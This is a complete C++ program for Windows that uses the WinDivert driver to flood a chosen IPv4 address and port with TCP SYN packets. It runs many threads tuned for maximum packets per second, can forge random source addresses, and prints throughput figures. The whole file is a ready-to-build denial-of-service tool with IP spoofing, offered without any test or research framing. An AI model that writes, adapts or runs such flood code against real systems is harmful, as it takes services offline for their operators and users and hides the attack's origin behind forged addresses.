// g++ -O2 -o NPtcpT.exe NPtcpT.cpp -I../Include -L../Lib/x64 -lWinDivert -lws2_32 -liphlpapi
// Требует: WinDivert.dll + WinDivert64.sys рядом с exe (права администратора)

#include <iostream>
#include <thread>
#include <atomic>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <vector>
#include <chrono>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <intrin.h>

#include "windivert.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "WinDivert.lib")

#pragma pack(push, 1)
struct ipv4_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4, doff:4;
    uint16_t fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};
#pragma pack(pop)

struct FastRand {
    uint64_t s[4];
    explicit FastRand(uint64_t seed) {
        s[0] = seed;
        s[1] = seed ^ 0x9e3779b97f4a7c15ULL;
        s[2] = seed ^ 0xbf58476d1ce4e5b9ULL;
        s[3] = seed ^ 0x94d049bb133111ebULL;
    }
    inline uint64_t next64() {
        uint64_t t = s[0];
        uint64_t const x = s[1];
        s[0] = x;
        t ^= t << 23;
        s[1] = s[2];
        s[2] = s[3];
        s[3] = t ^ x ^ (t >> 18) ^ (x >> 5);
        return s[3];
    }
    inline uint32_t next32() { return static_cast<uint32_t>(next64()); }
    // случайный IP без 0.x и 255.x в первом октете, unicast
    inline uint32_t next_ip() {
        uint32_t v = next32();
        uint8_t a = (v >> 24) & 0xFF;
        if (a == 0 || a == 127 || a >= 224) a = 1 + (v & 0x7F);
        return (v & 0x00FFFFFF) | (static_cast<uint32_t>(a) << 24);
    }
};

bool is_ipv6(const char* ip) {
    struct sockaddr_in6 sa6;
    return inet_pton(AF_INET6, ip, &sa6.sin6_addr) == 1;
}

// ones-complement fold
static inline uint16_t fold(uint32_t sum) {
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return static_cast<uint16_t>(sum);
}

static inline uint16_t csum_finalize(uint32_t sum) {
    return static_cast<uint16_t>(~fold(sum));
}

// сумма 16-битных слов буфера
static inline uint32_t csum_buffer(const void* data, size_t len) {
    const uint16_t* p = static_cast<const uint16_t*>(data);
    uint32_t sum = 0;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len) sum += *reinterpret_cast<const uint8_t*>(p);
    return sum;
}

class PrebuiltPacketIPv4 {
public:
    std::vector<uint8_t> buffer;
    size_t payload_size;
    uint32_t dst_ip;
    uint16_t tcp_len_net;          // htons(tcp+payload)
    uint32_t tcp_const_sum;        // сумма постоянных полей TCP+payload+pseudo(dst,proto,len)

    PrebuiltPacketIPv4(uint32_t src_ip, uint32_t dst_ip_, uint16_t dst_port, size_t packet_size)
        : dst_ip(dst_ip_)
    {
        size_t min_size = sizeof(ipv4_header) + sizeof(tcphdr);
        payload_size = (packet_size > min_size) ? (packet_size - min_size) : 0;
        buffer.assign(min_size + payload_size, 0);

        ipv4_header* ip = reinterpret_cast<ipv4_header*>(buffer.data());
        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->tot_len = htons(static_cast<uint16_t>(min_size + payload_size));
        ip->id = 0;
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = 6;
        ip->check = 0;
        ip->saddr = src_ip;
        ip->daddr = dst_ip_;

        tcphdr* tcp = reinterpret_cast<tcphdr*>(buffer.data() + sizeof(ipv4_header));
        tcp->source = 0;
        tcp->dest = htons(dst_port);
        tcp->seq = 0;
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(64240);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        tcp_len_net = htons(static_cast<uint16_t>(sizeof(tcphdr) + payload_size));

        // постоянная часть TCP checksum:
        // pseudo: dst + zero+proto + tcp_len  +  TCP fields except source/seq/check  + payload
        tcp_const_sum = 0;
        tcp_const_sum += (dst_ip_ & 0xFFFF);
        tcp_const_sum += (dst_ip_ >> 16);
        tcp_const_sum += htons(6);          // protocol in low byte of 16-bit word with zero
        // Actually pseudo is: src(4) dst(4) zero(1) proto(1) len(2)
        // zero|proto as uint16 in network order: htons(6) works if zero=0
        tcp_const_sum += tcp_len_net;

        // TCP header without source, seq, check (we'll add those each time)
        // dest, ack_seq, doff/flags, window, urg_ptr
        tcp_const_sum += tcp->dest;
        tcp_const_sum += static_cast<uint16_t>(tcp->ack_seq & 0xFFFF);
        tcp_const_sum += static_cast<uint16_t>(tcp->ack_seq >> 16);
        // words at offset of doff/flags and window
        const uint16_t* tw = reinterpret_cast<const uint16_t*>(tcp);
        // tw[0]=source (skip), tw[1]=dest (added), tw[2..3]=seq (skip),
        // tw[4..5]=ack (added), tw[6]=doff/flags, tw[7]=window, tw[8]=check(skip), tw[9]=urg
        tcp_const_sum += tw[6];
        tcp_const_sum += tw[7];
        tcp_const_sum += tw[9];

        if (payload_size)
            tcp_const_sum += csum_buffer(buffer.data() + sizeof(ipv4_header) + sizeof(tcphdr), payload_size);
    }

    size_t getSize() const { return buffer.size(); }
    uint8_t* getBuffer() { return buffer.data(); }

    // Полная быстрая установка изменяемых полей + checksum без alloca/memcpy
    inline void set_and_csum(uint32_t src_ip, uint16_t src_port_host, uint32_t seq_host) {
        ipv4_header* ip = reinterpret_cast<ipv4_header*>(buffer.data());
        tcphdr* tcp = reinterpret_cast<tcphdr*>(buffer.data() + sizeof(ipv4_header));

        ip->saddr = src_ip;
        tcp->source = htons(src_port_host);
        tcp->seq = htonl(seq_host);

        // IP header checksum (20 bytes) — дёшево
        ip->check = 0;
        ip->check = csum_finalize(csum_buffer(ip, sizeof(ipv4_header)));

        // TCP checksum = ~fold( const + src_ip + src_port + seq )
        uint32_t sum = tcp_const_sum;
        sum += (src_ip & 0xFFFF);
        sum += (src_ip >> 16);
        sum += tcp->source;
        sum += static_cast<uint16_t>(tcp->seq & 0xFFFF);
        sum += static_cast<uint16_t>(tcp->seq >> 16);
        tcp->check = csum_finalize(sum);
    }
};

class FloodEngine {
private:
    HANDLE divert;
    bool random_ip;
    uint16_t port_counter;
    FastRand rng;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    std::unique_ptr<PrebuiltPacketIPv4> packet4;
    uint32_t src_ip4_base;
    static constexpr int STOP_CHECK_INTERVAL = 4096;

public:
    FloodEngine(HANDLE handle, uint32_t src_ip, uint32_t dst_ip, uint16_t dst_port,
                int thread_index, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_ip_flag, size_t packet_size)
        : divert(handle), random_ip(random_ip_flag),
          port_counter(static_cast<uint16_t>(1024 + (thread_index * 997) % 64512)),
          rng(static_cast<uint64_t>(time(nullptr)) + thread_index * 123456789ULL),
          total_packets_sent(total_counter), stop_flag(stop)
    {
        packet4 = std::make_unique<PrebuiltPacketIPv4>(src_ip, dst_ip, dst_port, packet_size);
        src_ip4_base = src_ip;
    }

    void start(int core_id) {
        SetThreadAffinityMask(GetCurrentThread(), 1ULL << core_id);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

        uint64_t local_count = 0;
        int iter = 0;

        WINDIVERT_ADDRESS addr;
        memset(&addr, 0, sizeof(addr));
        addr.Outbound = 1;
        addr.Network.IfIdx = 0;
        addr.Network.SubIfIdx = 0;

        uint32_t src_ip = src_ip4_base;
        uint8_t* buf = packet4->getBuffer();
        UINT buf_len = static_cast<UINT>(packet4->getSize());

        while (true) {
            if (++iter >= STOP_CHECK_INTERVAL) {
                if (stop_flag.load(std::memory_order_relaxed)) break;
                iter = 0;
            }

            if (random_ip)
                src_ip = rng.next_ip();

            uint16_t src_port = port_counter++;
            if (port_counter < 1024) port_counter = 1024;

            packet4->set_and_csum(src_ip, src_port, rng.next32());

            UINT send_len = 0;
            if (WinDivertSend(divert, buf, buf_len, &send_len, &addr))
                local_count++;
        }
        total_packets_sent.fetch_add(local_count, std::memory_order_relaxed);
    }
};

int main(int argc, char* argv[]) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0]
                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec>"
                  << " [--random-ip] [--packet-size <bytes>]\n";
        std::cerr << "Requires Administrator + WinDivert.dll/WinDivert64.sys next to exe\n";
        return 1;
    }

    if (is_ipv6(argv[1]) || is_ipv6(argv[2])) {
        std::cerr << "IPv6 not supported in this version (only IPv4)\n";
        return 1;
    }

    uint32_t src_ip4 = inet_addr(argv[1]);
    uint32_t dst_ip4 = inet_addr(argv[2]);
    uint16_t dst_port = static_cast<uint16_t>(atoi(argv[3]));
    int num_threads = atoi(argv[4]);
    int duration = atoi(argv[5]);
    if (dst_port == 0 || num_threads <= 0 || duration < 0) return 1;

    bool random_ip = false;
    size_t packet_size = 0;

    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0)
            random_ip = true;
        else if (strcmp(argv[i], "--packet-size") == 0 && i + 1 < argc)
            packet_size = static_cast<size_t>(atoi(argv[++i]));
        else
            std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
    }


    size_t min_size = sizeof(ipv4_header) + sizeof(tcphdr);
    if (packet_size == 0) packet_size = min_size;
    else if (packet_size < min_size) packet_size = min_size;

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    if (num_threads <= 64) {
        DWORD_PTR proc_mask = (num_threads >= 64) ? ~static_cast<DWORD_PTR>(0)
                                                  : ((static_cast<DWORD_PTR>(1) << num_threads) - 1);
        SetProcessAffinityMask(GetCurrentProcess(), proc_mask);
    }

    HANDLE divert = WinDivertOpen("false", WINDIVERT_LAYER_NETWORK, 0, 0);
    if (divert == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        std::cerr << "WinDivertOpen failed, error = " << err << "\n";
        if (err == ERROR_ACCESS_DENIED)
            std::cerr << "  -> Run as Administrator\n";
        else if (err == ERROR_FILE_NOT_FOUND)
            std::cerr << "  -> WinDivert64.sys / WinDivert.dll not found next to exe\n";
        return 1;
    }

    std::cout << "WinDivert opened\n"
              << "Random IP: " << (random_ip ? "yes" : "no") << "\n"
              << "Packet size: " << packet_size << " bytes (IP+TCP)\n"
              << "Threads: " << num_threads << "\n";

    std::atomic<uint64_t> total_packets(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;
    if (cores == 0) cores = 1;

    auto start_time = std::chrono::steady_clock::now();

    for (int i = 0; i < num_threads; i++) {
        auto* engine = new FloodEngine(
            divert, src_ip4, dst_ip4, dst_port, i,
            total_packets, stop, random_ip, packet_size);
        workers.emplace_back([engine, i, cores]() {
            engine->start(static_cast<int>(i % cores));
            delete engine;
        });
    }

    if (duration > 0)
        std::this_thread::sleep_for(std::chrono::seconds(duration));
    else {
        std::cout << "Press Enter to stop...\n";
        std::cin.get();
    }

    stop = true;
    for (auto& w : workers)
        if (w.joinable()) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start_time).count();
    if (elapsed == 0) elapsed = 1;

    uint64_t pkts = total_packets.load();
    double pps = pkts * 1000.0 / elapsed;
    double mbps = (pps * packet_size * 8) / 1e6;

    std::cout << "\n--- Results ---\n"
              << "Total packets: " << pkts << "\n"
              << "Duration: " << elapsed << " ms\n"
              << "Throughput: " << pps << " pps\n"
              << "Bandwidth: " << mbps << " Mbps\n";

    WinDivertClose(divert);
    return 0;
}
